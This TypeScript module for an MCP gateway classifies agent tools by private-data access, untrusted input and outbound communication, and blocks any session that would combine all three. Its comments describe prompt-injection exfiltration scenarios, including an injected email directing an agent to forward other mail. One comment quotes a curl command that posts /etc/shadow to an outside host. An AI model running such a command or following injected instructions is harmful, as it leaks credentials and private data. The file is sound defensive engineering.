// "Lethal trifecta" classification and per-session blocking.
//
// A session is dangerous when it can do all three of:
//   privateData      read things that are not public (files, configs, secrets)
//   untrustedContent ingest text an outsider controls (an inbox anyone can write to)
//   externalComm     move data somewhere an outsider can read it
// Any two are fine. All three in one session is one prompt injection away from
// exfiltration: the untrusted content tells the agent to read the private data
// and send it out. Network isolation does not help when the sending tool is
// itself deliberately allowed outbound (a mail connector is).
//
// The model -- classify each tool on three axes, accumulate per session, refuse
// the call that would complete the set -- is Open Edison's. None of its code is
// used here (it is GPL-3.0); this is an independent implementation.
//
// Enforcement point: mcp-proxy.ts calls checkTrifecta() after a tools/call has
// resolved to a backend tool and BEFORE anything is forwarded, so a blocked call
// never reaches the backend. State is keyed by MCP transport session id (the
// same key as caller identity) and dropped in sse.ts's disposeSession().
//
// Ordering: authorization (policy.ts) decides whether this caller may use a
// tool at all; this check then decides whether this *session* may use it now.
// Configuration is the "trifecta" section of config/tool_policy.json (see the
// Configuration block below and TRIFECTA.md). With none, the built-in defaults
// apply in enforce mode.
import { logger } from './logger.js';
import type { CallerIdentity } from './identity.js';
import type { TransportConfig } from './config.js';

export type Axis = 'privateData' | 'untrustedContent' | 'externalComm';
export const AXES: readonly Axis[] = ['privateData', 'untrustedContent', 'externalComm'];

export type Classification = Record<Axis, boolean>;
type PartialClassification = Partial<Classification>;

export type TrifectaMode = 'enforce' | 'monitor' | 'off';

/** JSON-RPC error code for a call refused by this policy. In the server-error range. */
export const TRIFECTA_BLOCKED_CODE = -32010;

// --- Built-in defaults ----------------------------------------------------
//
// Backends are recognised by what they run (the stdio command line), not by
// what an admin named them, so a new ssh-mcp host is classified the moment it is
// added. the policy's trifecta.backendKinds can pin a backend's kind explicitly.

type BackendKind = 'ssh-mcp' | 'imap-mcp' | 'catalog' | 'context7' | 'unknown';

const P = (privateData: boolean, untrustedContent: boolean, externalComm: boolean): Classification =>
  ({ privateData, untrustedContent, externalComm });

/**
 * ssh-mcp. Every tool reaches a fleet host, so every tool is privateData.
 *
 * externalComm is decided per tool. A tool that can run an arbitrary command
 * can run `curl -d @/etc/shadow https://...`, so it is an exfiltration channel
 * whether or not the gateway's own network is isolated (the *host's* is not).
 * read-command is the exception: ssh-mcp enforces it against a read-only
 * allowlist that deliberately excludes curl/wget and refuses every shell
 * control character, so it cannot start a network client. sftp-upload counts as
 * external: writing an attacker-chosen file (a cron job, a hook) to a host is a
 * deferred command.
 *
 * Not untrustedContent by default, though host files can contain attacker text
 * (web logs, a mail server's spool). Marking every ssh read untrusted would make
 * a single ssh session complete the trifecta on its own. Hosts whose files are
 * mostly outsider-written can be marked per backend via trifecta.classify.
 *
 * Unlisted ssh-mcp tools (a future version adding one) get the conservative
 * private + external.
 */
const SSH_MCP_TOOLS: Record<string, Classification> = {
  'read-command':        P(true, false, false),
  'sftp-list':           P(true, false, false),
  'sftp-download':       P(true, false, false),
  'sftp-download-file':  P(true, false, false),
  'list-connections':    P(true, false, false),
  'list-sessions':       P(true, false, false),
  'read-session-output': P(true, false, false),
  'close-session':       P(true, false, false),
  'signal-process':      P(true, false, false),
  'run-command':         P(true, false, true),
  'privileged-command':  P(true, false, true),
  'open-session':        P(true, false, true),
  'sftp-upload':         P(true, false, true),
  'sftp-upload-file':    P(true, false, true),
};
const SSH_MCP_UNLISTED = P(true, false, true);

/**
 * imap-mcp. Anything that returns message content, headers or senders is
 * untrustedContent: an inbox is written by the internet. send_email is
 * externalComm. Mailbox housekeeping that returns only a status line is
 * classified as nothing.
 *
 * Mail content is arguably privateData as well. It is not marked so by default,
 * because then reading a message and replying to it in the same session would
 * itself be blocked. The consequence is that an injected email asking the agent
 * to forward *other emails* is not caught by this policy; set
 * "classify": {"<mail backend>/*": {"privateData": true}} to close that, at the
 * cost of replies needing a fresh session.
 *
 * Unlisted imap-mcp tools: untrusted (they probably read mail) + external.
 */
const IMAP_MCP_TOOLS: Record<string, Classification> = {
  'list_emails':   P(false, true, false),
  'search_emails': P(false, true, false),
  'read_email':    P(false, true, false),
  'list_folders':  P(false, false, false),
  'list_accounts': P(false, false, false),
  'mark_email':    P(false, false, false),
  'move_email':    P(false, false, false),
  'delete_email':  P(false, false, false),
  'send_email':    P(false, false, true),
};
const IMAP_MCP_UNLISTED = P(false, true, true);

/** The gateway's own connector catalog: lists entries, files an admin request. Neither leaves the box. */
const CATALOG_DEFAULT = P(false, false, false);

/**
 * Context7 (@upstash/context7-mcp): library documentation lookup. externalComm
 * only. The query text leaves the box, so it is an outbound channel. The docs it
 * returns are deliberately NOT treated as untrustedContent: they are published
 * library documentation, and marking them untrusted would refuse Context7 in
 * any session that has touched ssh, i.e. in the sessions that need it. The
 * residual risk, a poisoned doc page steering an agent, is accepted. Context7
 * plus ssh is still two axes. It becomes a block only if the same session also
 * reads mail.
 */
const CONTEXT7_DEFAULT = P(false, false, true);

/**
 * Anything not recognised. Conservative but not fail-closed: an unclassified
 * third-party integration is most likely an internet-facing API (docs lookup,
 * search, SaaS), i.e. it returns outsider-written text and sends our query text
 * out. So it is untrusted + external, and is refused in a session that has
 * touched private data. Marking it all three would refuse every unclassified
 * tool on first use. Override via trifecta.classify in the tool policy.
 */
const UNKNOWN_DEFAULT = P(false, true, true);

// --- Configuration --------------------------------------------------------
//
// Lives in the "trifecta" section of config/tool_policy.json, beside the
// per-tool authorization rules, and is compiled by policy.ts's compilePolicy().
// That gives it the same properties as the rest of the policy: re-read on
// change with no restart, validated by the admin API before it is written, and
// fail-closed when malformed. An invalid section makes the whole policy invalid,
// which denies all tool calls until fixed; a typo must never silently switch
// this check off.
//
//   "trifecta": {
//     "mode": "enforce" | "monitor" | "off",
//     "unknown":      { "untrustedContent": true, "externalComm": true },
//     "backendKinds": { "<backend>": "ssh-mcp" | "imap-mcp" | "catalog" | "context7" | "unknown" },
//     "classify":     { "<backend-glob>/<tool-glob>": { "<axis>": true|false } },
//     "allow": [ { "identity": "<username>|static", "tool": "<backend>/<tool>", "reason": "..." } ]
//   }
//
// Patterns use policy.ts's grammar ("*" or "<backend-glob>/<tool-glob>") on the
// ORIGINAL backend and tool names. classify entries apply in file order over the
// built-in default, so broad patterns go first and specific ones last.

interface Pattern { backend: RegExp; tool: RegExp; text: string }

interface AllowRule {
  /** caller username (users.json) or 'static'. Never matches unknown/anonymous callers. */
  identity?: string;
  tool?: Pattern;
  /** Required. Recorded in the audit line of every call this rule lets through. */
  reason: string;
}

export interface TrifectaConfig {
  mode: TrifectaMode;
  unknown: Classification;
  backendKinds: Record<string, BackendKind>;
  classify: { pattern: Pattern; axes: PartialClassification }[];
  allow: AllowRule[];
}

const KINDS: readonly BackendKind[] = ['ssh-mcp', 'imap-mcp', 'catalog', 'context7', 'unknown'];
const isMode = (m: unknown): m is TrifectaMode => m === 'enforce' || m === 'monitor' || m === 'off';
const isPlainObject = (v: unknown): v is Record<string, unknown> =>
  typeof v === 'object' && v !== null && !Array.isArray(v);

const globRe = (glob: string): RegExp =>
  new RegExp('^' + glob.replace(/[.+?^${}()|[\]\\]/g, '\\$&').replace(/\*/g, '.*') + '$');

// Same grammar as policy.ts compilePattern(). Kept local so that policy.ts can
// import this module without the two importing each other.
function compilePattern(p: unknown, where: string): Pattern {
  if (typeof p !== 'string' || !p) throw new Error(`${where}: pattern must be a non-empty string`);
  if (p === '*') return { backend: /^.*$/, tool: /^.*$/, text: p };
  const slash = p.indexOf('/');
  if (slash <= 0 || slash === p.length - 1) {
    throw new Error(`${where}: pattern "${p}" must be "*" or "<backend>/<tool>" (use "${p}/*" for a whole backend)`);
  }
  return { backend: globRe(p.slice(0, slash)), tool: globRe(p.slice(slash + 1)), text: p };
}

const patternMatches = (p: Pattern, backend: string, tool: string) => p.backend.test(backend) && p.tool.test(tool);

function compileAxes(v: unknown, where: string): PartialClassification {
  if (!isPlainObject(v)) throw new Error(`${where}: must be an object of axis booleans`);
  const out: PartialClassification = {};
  for (const [k, b] of Object.entries(v)) {
    if (!(AXES as readonly string[]).includes(k)) throw new Error(`${where}: unknown axis "${k}" (expected ${AXES.join(', ')})`);
    if (typeof b !== 'boolean') throw new Error(`${where}.${k}: must be true or false`);
    out[k as Axis] = b;
  }
  return out;
}

const merge = (base: Classification, over?: PartialClassification): Classification => {
  if (!over) return base;
  const out = { ...base };
  for (const a of AXES) if (typeof over[a] === 'boolean') out[a] = over[a] as boolean;
  return out;
};

/**
 * Validate and compile the "trifecta" section of the tool policy. Throws with a
 * readable message on anything malformed. undefined means the built-in defaults.
 */
export function compileTrifecta(raw: unknown): TrifectaConfig {
  const cfg: TrifectaConfig = { mode: 'enforce', unknown: UNKNOWN_DEFAULT, backendKinds: {}, classify: [], allow: [] };
  if (raw === undefined) return cfg;
  if (!isPlainObject(raw)) throw new Error('trifecta: must be an object');
  for (const k of Object.keys(raw)) {
    if (!['mode', 'unknown', 'backendKinds', 'classify', 'allow'].includes(k)) throw new Error(`trifecta: unknown key "${k}"`);
  }
  if (raw.mode !== undefined) {
    if (!isMode(raw.mode)) throw new Error('trifecta.mode: must be "enforce", "monitor" or "off"');
    cfg.mode = raw.mode;
  }
  if (raw.unknown !== undefined) cfg.unknown = merge(UNKNOWN_DEFAULT, compileAxes(raw.unknown, 'trifecta.unknown'));
  if (raw.backendKinds !== undefined) {
    if (!isPlainObject(raw.backendKinds)) throw new Error('trifecta.backendKinds: must be an object');
    for (const [b, k] of Object.entries(raw.backendKinds)) {
      if (!KINDS.includes(k as BackendKind)) throw new Error(`trifecta.backendKinds.${b}: must be one of ${KINDS.join(', ')}`);
      cfg.backendKinds[b] = k as BackendKind;
    }
  }
  if (raw.classify !== undefined) {
    if (!isPlainObject(raw.classify)) throw new Error('trifecta.classify: must be an object of pattern -> axes');
    for (const [p, axes] of Object.entries(raw.classify)) {
      const where = `trifecta.classify["${p}"]`;
      cfg.classify.push({ pattern: compilePattern(p, where), axes: compileAxes(axes, where) });
    }
  }
  if (raw.allow !== undefined) {
    if (!Array.isArray(raw.allow)) throw new Error('trifecta.allow: must be an array');
    raw.allow.forEach((r: unknown, i: number) => {
      const where = `trifecta.allow[${i}]`;
      if (!isPlainObject(r)) throw new Error(`${where}: must be an object`);
      for (const k of Object.keys(r)) if (!['identity', 'tool', 'reason'].includes(k)) throw new Error(`${where}: unknown key "${k}"`);
      if (typeof r.reason !== 'string' || !r.reason.trim()) throw new Error(`${where}: "reason" is required; every override is audited with it`);
      if (r.identity === undefined && r.tool === undefined) throw new Error(`${where}: needs "identity", "tool" or both`);
      if (r.identity !== undefined && (typeof r.identity !== 'string' || !r.identity)) throw new Error(`${where}.identity: must be a username or "static"`);
      cfg.allow.push({
        reason: r.reason,
        ...(r.identity !== undefined ? { identity: r.identity as string } : {}),
        ...(r.tool !== undefined ? { tool: compilePattern(r.tool, `${where}.tool`) } : {}),
      });
    });
  }
  return cfg;
}

/** No "trifecta" section (or no policy file): built-in defaults, enforcing. */
export const DEFAULT_TRIFECTA: Readonly<TrifectaConfig> = Object.freeze(compileTrifecta(undefined));

// The live backend set, for recognising a backend's kind from its command
// line. Refreshed by mcp-proxy.ts at startup and on every reload.
let backendConfigs: Record<string, TransportConfig> = {};
let separator = '__';

export function configureTrifecta(backends: Record<string, TransportConfig>, sep: string): void {
  backendConfigs = backends;
  separator = sep;
}

function detectKind(backend: string, cfg: TrifectaConfig): BackendKind {
  const pinned = cfg.backendKinds[backend];
  if (pinned) return pinned;
  const t: any = backendConfigs[backend];
  if (!t) return 'unknown';
  const words: string[] = [t.command, ...(Array.isArray(t.args) ? t.args : [])]
    .filter((w: unknown): w is string => typeof w === 'string');
  // Match the package/directory name as a path or spec segment, so a version
  // suffix (ssh-mcp@2.16.0) or an install path (.../ssh-mcp/build/index.js) is
  // recognised but an unrelated word containing the string is not.
  const has = (name: string) => words.some(w => new RegExp(`(^|[/\\\\@])${name}($|[/\\\\@])`).test(w));
  if (has('ssh-mcp')) return 'ssh-mcp';
  if (has('imap-mcp')) return 'imap-mcp';
  if (has('catalog-server')) return 'catalog';
  if (has('context7-mcp')) return 'context7';
  return 'unknown';
}

/** Classify one backend tool: the built-in default for its kind, then classify entries in order. */
export function classifyTool(backend: string, toolName: string, cfg: TrifectaConfig = DEFAULT_TRIFECTA): Classification {
  let c: Classification;
  switch (detectKind(backend, cfg)) {
    case 'ssh-mcp': c = SSH_MCP_TOOLS[toolName] || SSH_MCP_UNLISTED; break;
    case 'imap-mcp': c = IMAP_MCP_TOOLS[toolName] || IMAP_MCP_UNLISTED; break;
    case 'catalog': c = CATALOG_DEFAULT; break;
    case 'context7': c = CONTEXT7_DEFAULT; break;
    default: c = cfg.unknown;
  }
  for (const { pattern, axes } of cfg.classify) {
    if (patternMatches(pattern, backend, toolName)) c = merge(c, axes);
  }
  return c;
}

export const axesOf = (c: Classification): Axis[] => AXES.filter(a => c[a]);

// --- Per-session state ----------------------------------------------------

interface SessionTrifecta {
  /** axis -> the first tool key that gave this session that axis (for the error message). */
  touched: Map<Axis, string>;
}
const sessions = new Map<string, SessionTrifecta>();

// stdio mode and any request whose session cannot be resolved share one bucket.
// Sharing only ever makes the policy stricter, never looser.
const NO_SESSION = '(no-session)';

export const clearSessionTrifecta = (sessionId: string): void => { sessions.delete(sessionId); };

/** Axes this session has touched so far. For tests and diagnostics. */
export const sessionAxes = (sessionId: string | undefined): Axis[] =>
  AXES.filter(a => sessions.get(sessionId || NO_SESSION)?.touched.has(a));

export interface TrifectaDecision {
  allowed: boolean;
  /** Present when the call would complete the trifecta (whether or not it was then allowed). */
  detail?: {
    mode: TrifectaMode;
    sessionAxes: Axis[];
    toolAxes: Axis[];
    /** Axes this call would have added that the session lacked. */
    completing: Axis[];
    /** axis -> earlier tool that supplied it. */
    sources: Partial<Record<Axis, string>>;
    blocked: boolean;
    override?: { reason: string; identity?: string; tool?: string };
  };
  message?: string;
}

const AXIS_PHRASE: Record<Axis, string> = {
  privateData: 'read private data',
  untrustedContent: 'read untrusted outside content',
  externalComm: 'communicate externally',
};

function findOverride(cfg: TrifectaConfig, identity: CallerIdentity, backend: string, tool: string): AllowRule | undefined {
  // Identity overrides need an attributable caller. An unresolved or
  // anonymous session can never be exempted by name.
  const named = identity.kind === 'user' || identity.kind === 'static';
  return cfg.allow.find(r =>
    (r.identity === undefined || (named && r.identity === identity.username)) &&
    (r.tool === undefined || patternMatches(r.tool, backend, tool)));
}

/**
 * Decide one call, and if it is allowed, record its axes against the session.
 *
 * Synchronous on purpose: check-and-accumulate has no await in between, so two
 * concurrent calls on one session cannot both pass on stale state.
 *
 * Axes are recorded when a call is allowed, before it is forwarded -- not after
 * it succeeds. A backend that errors may still have returned content (in the
 * error text), and a policy that only counted successes could be stepped around
 * by a call engineered to fail.
 */
export function checkTrifecta(
  sessionId: string | undefined,
  identity: CallerIdentity,
  backend: string,
  toolName: string,
  cfg: TrifectaConfig = DEFAULT_TRIFECTA,
): TrifectaDecision {
  const mode = cfg.mode;
  if (mode === 'off') return { allowed: true };

  const sid = sessionId || NO_SESSION;
  const toolKey = `${backend}${separator}${toolName}`;
  const cls = classifyTool(backend, toolName, cfg);
  const toolAxes = axesOf(cls);

  let state = sessions.get(sid);
  const have = AXES.filter(a => state?.touched.has(a));
  const wouldHave = new Set<Axis>([...have, ...toolAxes]);

  const record = () => {
    if (toolAxes.length === 0) return;
    if (!state) { state = { touched: new Map() }; sessions.set(sid, state); }
    for (const a of toolAxes) if (!state.touched.has(a)) state.touched.set(a, toolKey);
  };

  // A tool with no axes can never contribute to exfiltration, even in a session
  // that already holds all three (possible only via an override or monitor mode).
  if (toolAxes.length === 0 || wouldHave.size < AXES.length) {
    record();
    return { allowed: true };
  }

  const completing = toolAxes.filter(a => !have.includes(a));
  const sources: Partial<Record<Axis, string>> = {};
  for (const a of have) sources[a] = state!.touched.get(a)!;

  const rule = findOverride(cfg, identity, backend, toolName);
  const base = { mode, sessionAxes: have, toolAxes, completing, sources };

  if (rule) {
    record();
    logger.warn(`trifecta: OVERRIDE session=${sid} user=${identity.username} tool=${toolKey} reason="${rule.reason}"`);
    return {
      allowed: true,
      detail: { ...base, blocked: false, override: { reason: rule.reason, identity: rule.identity, tool: rule.tool?.text } },
    };
  }

  // A tool classified on all three axes completes the set by itself, so it is
  // refused in every session, including a fresh one with nothing to cite.
  const message = toolAxes.length === AXES.length
    ? `Blocked by the gateway's lethal-trifecta policy: "${toolKey}" would ` +
      `${toolAxes.map(a => AXIS_PHRASE[a]).join(' and ')}; this one tool alone combines ` +
      `all three, so it is refused in every session. A single session that can read ` +
      `private data, read untrusted content and communicate externally can be ` +
      `prompt-injected into exfiltrating data. Nothing was sent to the backend. A gateway ` +
      `admin can reclassify this tool in the trifecta section of tool_policy.json or add ` +
      `an allow rule for it.`
    : blockMessage(toolKey, have, toolAxes, completing, sources);

  if (mode === 'monitor') {
    record();
    logger.warn(`trifecta: MONITOR (would block) session=${sid} user=${identity.username} tool=${toolKey}`);
    return { allowed: true, detail: { ...base, blocked: false } };
  }

  logger.warn(`trifecta: BLOCKED session=${sid} user=${identity.username} tool=${toolKey} had=[${have.join(',')}] adds=[${toolAxes.join(',')}]`);
  return { allowed: false, detail: { ...base, blocked: true }, message };
}

function blockMessage(
  toolKey: string, have: Axis[], toolAxes: Axis[], completing: Axis[], sources: Partial<Record<Axis, string>>,
): string {
  const already = have.map(a => `${AXIS_PHRASE[a]} (via ${sources[a]})`).join(' and ');
  const adds = completing.length
    ? `would ${completing.map(a => AXIS_PHRASE[a]).join(' and ')}`
    : `would ${toolAxes.map(a => AXIS_PHRASE[a]).join(' and ')} in a session that already holds all three (an earlier call was let through by an override or monitor mode)`;
  return `Blocked by the gateway's lethal-trifecta policy: "${toolKey}" ${adds}, ` +
    `and this session has already used tools that ${already}. A single session that can ` +
    `read private data, read untrusted content and communicate externally can be ` +
    `prompt-injected into exfiltrating data, so the gateway refuses the call that would ` +
    `complete that set. Nothing was sent to the backend. Other calls in this session ` +
    `still work; to make this call, do it in a new session that has not read untrusted ` +
    `content or private data, or ask a gateway admin for an audited override.`;
}

/**
 * Tools whose own classification covers all three axes. In enforce mode each is
 * refused in every session unless an allow rule exempts the caller, which is
 * almost always a misconfiguration worth a startup/reload warning. Returns
 * "backend/tool" names, sorted; empty when the mode is not enforce.
 */
export function selfCompletingTools(tools: { backend: string; tool: string }[], cfg: TrifectaConfig = DEFAULT_TRIFECTA): string[] {
  if (cfg.mode !== 'enforce') return [];
  return tools
    .filter(({ backend, tool }) => axesOf(classifyTool(backend, tool, cfg)).length === AXES.length)
    .map(({ backend, tool }) => `${backend}/${tool}`)
    .sort();
}

/** One startup/reload line per axis, plus the tools that fell through to the unknown default. */
export function summarizeClassification(tools: { backend: string; tool: string }[], cfg: TrifectaConfig = DEFAULT_TRIFECTA): string {
  const counts: Record<Axis, number> = { privateData: 0, untrustedContent: 0, externalComm: 0 };
  const unknownBackends = new Set<string>();
  for (const { backend, tool } of tools) {
    const c = classifyTool(backend, tool, cfg);
    for (const a of AXES) if (c[a]) counts[a]++;
    if (detectKind(backend, cfg) === 'unknown' && !cfg.classify.some(e => e.pattern.backend.test(backend))) unknownBackends.add(backend);
  }
  const unk = unknownBackends.size
    ? `; unclassified backends on the unknown default (untrusted+external unless overridden): ${[...unknownBackends].sort().join(', ')}`
    : '';
  return `trifecta: mode=${cfg.mode}, ${cfg.allow.length} allow rule(s); ${tools.length} tools classified -- privateData ${counts.privateData}, ` +
    `untrustedContent ${counts.untrustedContent}, externalComm ${counts.externalComm}${unk}`;
}
